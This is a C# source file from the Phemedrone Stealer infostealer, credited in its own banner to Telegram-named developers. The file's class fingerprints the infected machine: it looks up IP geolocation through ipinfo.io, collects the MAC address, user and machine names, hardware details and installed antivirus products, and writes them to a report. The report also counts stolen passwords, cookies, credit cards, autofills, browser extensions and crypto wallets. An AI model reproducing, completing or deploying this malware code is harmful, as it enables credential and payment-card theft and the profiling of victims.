using System;
using System.Collections.Generic;
using System.Text;
using Phemedrone.Classes;
using System.IO;
using System.Net;
using System.Reflection;
using System.Text;
using Microsoft.Win32;
using System.Net.NetworkInformation;
using System.Management;
using System.Diagnostics;
using Phemedrone.Extensions;

namespace Phemedrone.Services
{
    public class Information : IService
    {
        public override PriorityLevel Priority => PriorityLevel.Low;
        public static string JsonString = GetGeoInformation();
        protected override LogRecord[] Collect()
        {
            const int padding = -25;
            var totalRam = GetTotalRam();
            var jsonParser = new JsonParser();
            var report = $@"
    ,d88b.d88b,    
    88888888888    Phemedrone Stealer
    `Y8888888Y'    {DateTime.Now:dd/MM/yyyy HH:mm:ss}
      `Y888Y'      Developed by https://t.me/reyvortex & https://t.me/TheDyer
        `Y'        Tag: {Config.Tag}

    ----- Geolocation Data -----

{"IP:",padding}{jsonParser.ParseString("ip", JsonString)}
{"Country code:",padding}{jsonParser.ParseString("country", JsonString)}
{"City:",padding}{jsonParser.ParseString("city", JsonString)}
{"Postal:",padding}{jsonParser.ParseString("postal", JsonString)}
{"MAC:",padding}{GetMac()}

    ----- Hardware Info -----

{"Username:",padding}{Environment.UserName}\{Environment.MachineName} 
{"Windows name:",padding}{GetWindowsVersion()} {(Environment.Is64BitOperatingSystem ? "x64" : "x32")}
{"GPU:",padding}{string.Join($"\r\n{"",padding}", GetGPUs())}
{"CPU:",padding}{GetCPU()}
{"RAM:",padding}{Math.Round(totalRam - GetUsedRam(), 2)} / {Math.Round(totalRam, 2)} GB

    ----- Report Contents -----

{"Passwords:",padding}{ServiceCounter.PasswordList.Count}
{"Cookies:",padding}{ServiceCounter.CookieCount}
{"Credit Cards:",padding}{ServiceCounter.CreditCardCount}
{"AutoFills:",padding}{ServiceCounter.AutoFillCount}
{"Extensions",padding}{ServiceCounter.ExtensionsCount}
{"Wallets:",padding}{ServiceCounter.WalletsCount}
{"Files:",padding}{ServiceCounter.FilesCount}
    ----- Miscellaneous -----

{"Antivirus products:",padding}{string.Join(", ", GetAv())}
{"File Location:",padding}{Assembly.GetEntryAssembly().Location}";
            return new[]
            {
                new LogRecord
                {
                    
                    Path = "Information.txt",
                    Content = Encoding.UTF8.GetBytes(report)
                }
            };
            
        }

        private static string GetGeoInformation()
        {
            try
            {
                using (var client = new WebClient())
                {
                    return client.DownloadString("https://ipinfo.io/json");
                }
            }
            catch
            {
                return "Unknown";
            }
        }

        private static string GetWindowsVersion()
        {
            var ver = NullableValue.Call(() =>
                Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ProductName",
                    ""));
            return ver?.ToString() ?? "Unknown";
        }

        private static IEnumerable<string> GetAv()
        {
            var result = new List<string>();
            var searcher = new ManagementObjectSearcher("root\\SecurityCenter2", "SELECT * FROM AntivirusProduct");
            var antivirusList = searcher.Get();
            foreach (var obj in antivirusList)
            {
                var productName = obj["displayName"].ToString();
                result.Add(productName);
            }
            return result;
        }

        private static string GetMac()
        {
            foreach (var networkInterfaces in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (networkInterfaces.OperationalStatus != OperationalStatus.Up) continue;
                
                var physAddress = networkInterfaces.GetPhysicalAddress();
                var addressBytes = physAddress.GetAddressBytes();
                var macString = string.Empty;
                for (var i = 0; i < addressBytes.Length; i++)
                {
                    macString += addressBytes[i].ToString("X2");
                    if (i != addressBytes.Length - 1)
                    {
                        macString += ":";
                    }
                }

                return macString;
            }
            return "Unknown";
        }

        private static double GetUsedRam()
        {
            var usedCounter = new PerformanceCounter("Memory", "Available Bytes");
            var usedBytes = (long)usedCounter.NextValue();
            return Math.Floor(usedBytes / 1024d / 1024d / 1024d);
        }

        public static IEnumerable<string> GetGPUs()
        {
            var result = new List<string>();
            var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_VideoController");
            foreach (var obj in searcher.Get())
            {
                result.Add(obj["Name"]?.ToString()
                    ?? "Unknown");
            }

            if (result.Count < 1)
            {
                result.Add("Unknown");
            }
            
            return result;
        }

        private static string GetCPU()
        {
            var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_Processor");
            foreach (var obj in searcher.Get())
            {
                return obj["Name"]?.ToString()
                    ?? "Unknown";
            }
            return "Unknown";
        }
        
        private static double GetTotalRam()
        {
            var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_ComputerSystem");
            foreach (var obj in searcher.Get())
            {
                return Convert.ToDouble(obj["TotalPhysicalMemory"]?.ToString() ?? "0")
                    / 1024d / 1024d / 1024d;
            }
            return 0;
        }
    }
}